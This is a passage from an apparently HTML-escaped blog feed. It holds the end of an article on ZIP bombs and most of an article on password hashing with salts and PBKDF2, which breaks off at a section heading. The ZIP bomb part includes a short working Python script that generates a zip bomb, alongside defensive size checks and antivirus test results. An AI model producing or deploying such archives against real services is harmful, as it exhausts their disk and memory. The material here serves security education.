    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_zipbomb&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inner_file_size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nb_inner_files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_txt_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size_in_byte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;inner_file_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;ZipFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"zipbomb.zip"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"w"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ZIP_LZMA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;myzip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nb_inner_files&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;myzip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.txt"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;"__main__"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;create_zipbomb&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inner_file_size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nb_inner_files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;David Fifield also proved that it&amp;rsquo;s possible to create a zip bomb with has 42MB and extracts to 4.5PB in a &lt;strong&gt;non-recursive&lt;/strong&gt; way (&lt;a href="https://www.bamsoftware.com/hacks/zipbomb/"&gt;source&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;There are also quines for ZIP files. A quine is a program that produces its source code as output. A ZIP-quine contains itself when uncompressed. One well-known one is droste.zip (&lt;a href="https://alf.nu/ZipQuine"&gt;source&lt;/a&gt;), but there are more (&lt;a href="https://research.swtch.com/zip"&gt;source&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;You might also be able to create them manually by investigating the &lt;a href="https://www.iso.org/standard/60101.html"&gt;ZIP standard&lt;/a&gt; and crafting the file.&lt;/p&gt;
&lt;h2 id="should-i-be-worried"&gt;Should I be worried?&lt;/h2&gt;
&lt;p&gt;I wouldn&amp;rsquo;t be worried. As &lt;a href="https://en.wikipedia.org/wiki/Tavis_Ormandy"&gt;Travis Ormandy&lt;/a&gt; pointed out, 21 out of 58 anti-virus programs could detect the zip bomb. 6 timed out, 11 could not process the files and 20 thought the file is fine.&lt;/p&gt;
&lt;p&gt;This article is more of a friendly reminder that this type of attack exists and that one should be careful when archives are unpacked.&lt;/p&gt;
&lt;p&gt;I found this topic in a couple of places:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2005: bzip2 (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2005-1260"&gt;CVE-2005&amp;ndash;1260&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2009: Apache Tika (&lt;a href="https://issues.apache.org/jira/browse/TIKA-259?attachmentSortBy=fileName"&gt;Safe parsing of droste.zip&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2018: Akka (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16131"&gt;CVE-2018&amp;ndash;16131&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2019: Python (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9674"&gt;CVE-2019&amp;ndash;9674&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2019: Info-ZIP (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13232"&gt;CVE-2019&amp;ndash;13232&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2019: ClamAV (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12625"&gt;CVE-2019&amp;ndash;12625&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2020: Wireshark (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25866"&gt;CVE-2020&amp;ndash;25866&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="get-the-size-of-a-zip-file-without-extracting-data"&gt;Get the size of a ZIP file without extracting data&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;zipfile&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_extracted_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""Get the extracted size in bytes."""&lt;/span&gt;
    &lt;span class="n"&gt;zp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zipfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ZipFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;zinfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file_size&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;zinfo&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;zp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filelist&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Simple enough, isn&amp;rsquo;t it?&lt;/p&gt;
&lt;p&gt;The problem is that you can nest ZIP files. So the extracted files could again contain zipped files. If you apply recursion, you might want to have a maximum recursion depth and keep track of the used memory/disk space.&lt;/p&gt;
&lt;h2 id="the-state-of-av-software"&gt;The State of AV Software&lt;/h2&gt;
&lt;p&gt;I was curious to know if anti-virus software can detect zip bombs. So I tested some and contacted some of the developers.&lt;/p&gt;
&lt;h3 id="virustotal"&gt;Virustotal&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/VirusTotal"&gt;Virustotal&lt;/a&gt; offers a form where users can upload files and check the results of various programs. Here are the results for my test files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/bbd05de19aa2af1455c0494639215898a15286d9b05073b6c4817fe24b2c36fa/detection"&gt;42.zip&lt;/a&gt;: Only &lt;a href="https://en.wikipedia.org/wiki/Fortinet"&gt;Fortinet&lt;/a&gt; detected it. 12 programs were unable to process it.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/ad187b3c99dcaa837438d580a3886f67ac1799e475e8fced23a02fb44ebaf41f/detection"&gt;dorste.zip&lt;/a&gt;: &lt;a href="https://en.wikipedia.org/wiki/Avast"&gt;Avast&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/AVG_AntiVirus"&gt;AVG&lt;/a&gt;, Cyren, &lt;a href="https://en.wikipedia.org/wiki/ESET"&gt;Eset&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/Sophos"&gt;Sophos&lt;/a&gt;, and &lt;a href="https://en.wikipedia.org/wiki/Trend_Micro"&gt;Trend Micro&lt;/a&gt; detected it. 10 programs were unable to process the file.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/725d25f1f5ecf498210c546d517e25f70ea07b48423de2a4648db80b56b81f56/detection"&gt;self-built.zip&lt;/a&gt;: Antiy-AVL, Baidu, MAX detected it. 7 timed out. 11 were unable to process it.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="clamav"&gt;ClamAV&lt;/h3&gt;
&lt;p&gt;The first release of &lt;a href="https://en.wikipedia.org/wiki/Clam_AntiVirus"&gt;ClamAV&lt;/a&gt; was in 2001, it was developed by Cisco and is open-source now. I&amp;rsquo;ve installed ClamAV 0.102.4/25962 . I try it with the &lt;a href="https://pypi.org/project/clamd/"&gt;clamd&lt;/a&gt; binding:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;clamd&lt;/span&gt;

&lt;span class="n"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clamd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ClamdUnixSocket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/home/martin-thoma/bomb.zip"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It gave the same output fordroste.zip , 42.zip , and my self-built.zip . None of them were detected.&lt;/p&gt;
&lt;h3 id="commercial-av-software"&gt;Commercial AV Software&lt;/h3&gt;
&lt;p&gt;I&amp;rsquo;ve contacted Avast, AVG, ESET, Sophos, and Trend Micro via private Twitter messages. I&amp;rsquo;ve explained that I&amp;rsquo;m writing a blog post and that their product &amp;mdash; according to VirusTotal &amp;mdash; does not recognize the ZIP bombs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TrendMicro&lt;/strong&gt; sent me to their &lt;a href="https://helpcenter.trendmicro.com/en-US/contact-support/"&gt;support site&lt;/a&gt;. I think I wrote them a support ticket, but due to the fact that this is just a web form and I don&amp;rsquo;t have any copy of that, I&amp;rsquo;m not sure. Those contact forms are super annoying and I gave up trying to ask the question.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sophos&lt;/strong&gt; redirected me to their &lt;a href="https://support.sophos.com/support"&gt;support site&lt;/a&gt;. I have opened a case and I&amp;rsquo;m waiting for a response.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Avast&lt;/strong&gt; gave me a brief answer, but it was super unclear to me what they are actually doing. I&amp;rsquo;m still trying to clarify.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVG&lt;/strong&gt; responded, but essentially told me that they try to find the answer to my question internally.&lt;/p&gt;
&lt;p&gt;In contrast, the experience with &lt;strong&gt;ESET&lt;/strong&gt; was extremely positive. I&amp;rsquo;ve got in contact with &lt;a href="https://www.linkedin.com/in/thomas-uhlemann-6661a382/"&gt;Thomas Uhlemann&lt;/a&gt; who could directly tell me what ESET is doing: They check archives until a depth of 10, meaning they can limit the effect of recursive packing. Additionally, they put limitations on the file size, memory usage, and the maximum amount of time for a scan. Apparently, the users can also adjust those limits. This information is also &lt;a href="https://help.eset.com/eis/14/en-US/idh_config_threat_sense.html"&gt;publicly documented&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="whats-next_1"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="AppSec"></category><category term="DOS"></category></entry><entry><title>Password Hashing üòá</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/password-hashing-eb3b97684636" rel="alternate"></link><published>2020-10-19T20:00:00+02:00</published><updated>2020-10-19T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-19:/https://levelup.gitconnected.com/password-hashing-eb3b97684636</id><summary type="html">&lt;p&gt;Software gets hacked, data breaches happen, data is leaked. It&amp;rsquo;s not a rare exception but happens all the time. We need to acknowledge that software is not perfect. This is where the concept of defense in depth comes into play.&lt;/p&gt;
&lt;blockquote&gt;
&lt;h1 id="defense-in-depth-means-we-dont-rely-on-a-single-security-mechanism-but-have-multiple-layers-of-security-instead"&gt;Defense in depth means we don&amp;rsquo;t rely on ‚Ä¶&lt;/h1&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;Software gets hacked, data breaches happen, data is leaked. It&amp;rsquo;s not a rare exception but happens all the time. We need to acknowledge that software is not perfect. This is where the concept of defense in depth comes into play.&lt;/p&gt;
&lt;blockquote&gt;
&lt;h1 id="defense-in-depth-means-we-dont-rely-on-a-single-security-mechanism-but-have-multiple-layers-of-security-instead"&gt;Defense in depth means we don&amp;rsquo;t rely on a single security mechanism, but have multiple layers of security instead.&lt;/h1&gt;
&lt;/blockquote&gt;
&lt;p&gt;Password hashing is a prime example of defense in depth. If our database is secure, we don&amp;rsquo;t need password hashing. We hope it is the case and defend the database as well as possible, but we prepare for the worst case. We prepare for an attacker getting access to our users&amp;rsquo; login credentials.&lt;/p&gt;
&lt;p&gt;A key idea of privacy comes into play: You don&amp;rsquo;t have to worry about data you don&amp;rsquo;t have. In the case of passwords, we don&amp;rsquo;t store the passwords. Not even an encrypted version. We store a hashed version.&lt;/p&gt;
&lt;p&gt;This way the effect is hopefully limited to our service. We need to tell the users that their accounts and data might have been exposed, but at least nobody will use the same username/password combination to log into their bank/Amazon/Social accounts.&lt;/p&gt;
&lt;h2 id="what-is-hashing"&gt;What is Hashing?&lt;/h2&gt;
&lt;p&gt;Hashing is like cooking. Given the recipe (the hashing algorithm) and the ingredients (the password), you can always get the same result. Just given the result (the hash), it is virtually impossible to reverse the process (figure out the password).&lt;/p&gt;
&lt;p&gt;There are non-cryptographic hashing functions and cryptographic ones. The cryptographic ones are designed to be hard to compute. Meaning they take a lot of CPU power/time to apply. This is on purpose. If you need a few milliseconds to apply it on your (weak) server, the attacker hopefully also needs quite a while to apply it billions of times on huge dictionaries to crack the encrypted accounts with brute force.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Photo by American Heritage Chocolate on Unsplash" src="https://cdn-images-1.medium.com/max/11800/0*JY7QzN4RasPmA7Nf"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@americanheritagechocolate?utm_source=medium&amp;amp;utm_medium=referral"&gt;American Heritage Chocolate&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
&lt;p&gt;There are &lt;a href="https://en.wikipedia.org/wiki/List_of_data_breaches"&gt;so many leaks&lt;/a&gt;, it is hard to keep track of the leaks.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2012&lt;/strong&gt;: LinkedIn leaked 6.5 million passwords. Passwords have been hashed with SHA-1 and were not salted (&lt;a href="https://arstechnica.com/information-technology/2012/06/8-million-leaked-passwords-connected-to-linkedin/"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2013&lt;/strong&gt;: Adobe leaked 130 million passwords (&lt;a href="https://www.theguardian.com/technology/2013/nov/07/adobe-password-leak-can-check"&gt;source&lt;/a&gt;). The passwords were encrypted, not hashed.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2016&lt;/strong&gt;: LinkedIn got hacked and used a weak hashing algorithm (&lt;a href="https://www.zdnet.com/article/these-are-the-worst-passwords-from-the-linkedin-hack"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: 1.2 million passwords got leaked via the porn site Luscious(&lt;a href="https://www.forbes.com/sites/daveywinder/2019/08/20/popular-porn-site-breach-exposed-12-million-anonymous-user-profiles/#3c0cbe067039"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Facebook had hundreds of millions of passwords stored in plain text (&lt;a href="https://about.fb.com/news/2019/03/keeping-passwords-secure/"&gt;source 1&lt;/a&gt;, &lt;a href="https://www.nytimes.com/2019/03/21/technology/personaltech/facebook-passwords.html"&gt;source 2&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Zynga leaked 170 million passwords (&lt;a href="https://www.theguardian.com/games/2019/dec/19/170m-passwords-stolen-in-zynga-words-with-friends-hack-monitor-says"&gt;source&lt;/a&gt;). Zynga used hashing and salting.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can see if you might have been affected by &lt;a href="https://haveibeenpwned.com/"&gt;haveibeenpwned.com&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="salt-because-hashing-is-not-enough"&gt;Salt &amp;mdash; because hashing is not enough&lt;/h2&gt;
&lt;p&gt;When credentials are leaked, it essentially is a big table with usernames and
the (hopefully) hashed passwords. If you applied the same algorithm to all
passwords, you can see which users have the same passwords. Extra information
such as the user names, the usage of the platform, or other attacks such as
phishing might lead to information about those passwords.&lt;/p&gt;
&lt;p&gt;To counter such password cracking attacks, a string is added to the password.
This string is randomly generated for each user. The string is stored
side-by-side to the password. The only reason to have that string is to make
the same plain-text password have different hash values.&lt;/p&gt;
&lt;h2 id="how-can-i-hash-passwords"&gt;How can I hash passwords?&lt;/h2&gt;
&lt;p&gt;Computing a key from a password which then can be stored now got quite a bit
more complex: We need the password, a hashing function, a random salt per user,
and sometimes even a number of rounds to hash. There is a lot of possibilities
to get it wrong. Also, what do you do to migrate from one hashing function to
another? What do you do to increase the number of rounds as hardware becomes
better?&lt;/p&gt;
&lt;p&gt;You for sure don&amp;rsquo;t want to always force users to enter a new password. You want
to be able to let users migrate over time.&lt;/p&gt;
&lt;p&gt;A key derivation function as implemented in Pythons
&lt;a href="https://pypi.org/project/Werkzeug/"&gt;werkzeug&lt;/a&gt; package with adjustable
computational difficulty like &lt;a href="https://en.wikipedia.org/wiki/PBKDF2"&gt;PBKDF2&lt;/a&gt; is
your friend. It&amp;rsquo;s a function that takes the password, the hashing function, the
salt, the number of rounds. It returns the key. In most programming languages
you two functions:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hash_function&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt_length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;check_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As an example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; **from** werkzeug.security **import** generate_password_hash as gen_key
&amp;gt;&amp;gt;&amp;gt; key = **gen_key**("foobar", "pbkdf2:sha512:1000", salt_length=8)

&amp;gt;&amp;gt;&amp;gt; key
'pbkdf2:sha512:1000**$**qc8Q9uqK**$**4f28daacb10dea6667e00c866607073b7a740817e8c4a267c1cedd05cf36cbdf609b14cf446d73d76819f37a3e0475160d444a4fab39526e72aca611960e4c77'

&amp;gt;&amp;gt;&amp;gt; **from** werkzeug.security **import** check_password_hash as check_key
&amp;gt;&amp;gt;&amp;gt; **check_key**(key, "foobar")
True
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can see that the first part of the method contains all the parameters necessary for the method. This means it is easy to extend. The second part (delimited by the Dollar symbol) is the 8 characters of the salt. Then comes the password which is hashed with the given method and salt.&lt;/p&gt;
&lt;p&gt;There are other key derivate functions. Most notably &lt;a href="https://en.wikipedia.org/wiki/Scrypt"&gt;scrypt&lt;/a&gt;, which was not only designed to be demanding to the CPU but also requires much memory. For Python, there is passlib which offers a lot of hashing functions and key derivation functions. However, it seems not too wide-spread (&lt;a href="https://github.com/pallets/werkzeug/issues/1917#issuecomment-710762497"&gt;source&lt;/a&gt;). Instead, you can create something similar on your own by using core Python functions such as &lt;a href="https://docs.python.org/3/library/hashlib.html#hashlib.scrypt"&gt;hashlib.scrypt&lt;/a&gt; . A noteworthy key derivation function is &lt;a href="https://en.wikipedia.org/wiki/Argon2"&gt;Argon2&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="common-mistakes"&gt;Common Mistakes&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s make a checklist. If you are a developer, I hope you can checkmark those:&lt;/p&gt;
&lt;p&gt;‚òë I don&amp;rsquo;t store passwords in plain text.
‚òë I don&amp;rsquo;t use encryption for passwords.
‚òë I don&amp;rsquo;t use a non-cryptographic hashing function (e.g. CRC-32, )
‚òë I don&amp;rsquo;t use a weak cryptographic hashing function (e.g. MD5, SHA-1)
‚òë I use a different, randomly calculated salt for each user for calculating the hashes.&lt;/p&gt;
&lt;p&gt;As a user, I hope you can checkmark the following points:&lt;/p&gt;
&lt;p&gt;‚òë I don&amp;rsquo;t re-use passwords. Ever.
‚òë I don&amp;rsquo;t share my passwords.
‚òë I don&amp;rsquo;t use weak passwords.
‚òë I make sure I don&amp;rsquo;t &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;leak my secrets&lt;/a&gt;.
‚òë I am aware of phishing. (If you are not &amp;mdash; a blog post will followüòÄ)&lt;/p&gt;
&lt;p&gt;As a developer, you can prevent some mistakes from the user by a password policy. For example, making it mandatory to have at least 8 characters and maybe run the password through a simple dictionary attack before you allow it. I wouldn&amp;rsquo;t put password rules up, though. &lt;a href="https://xkcd.com/936/"&gt;XKCD 936&lt;/a&gt; explains why.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Image by Oliver Widder (Geek and Poke)" src="https://cdn-images-1.medium.com/max/2992/1*BYKHbPTILDYTxW2Xug8xPA.jpeg"/&gt;&lt;em&gt;Image by Oliver Widder (&lt;a href="https://geekandpoke.typepad.com/geekandpoke/2009/08/post20-security.html"&gt;Geek and Poke&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="what-can-i-do-as-a-user"&gt;What can I do as a user?&lt;/h2&gt;
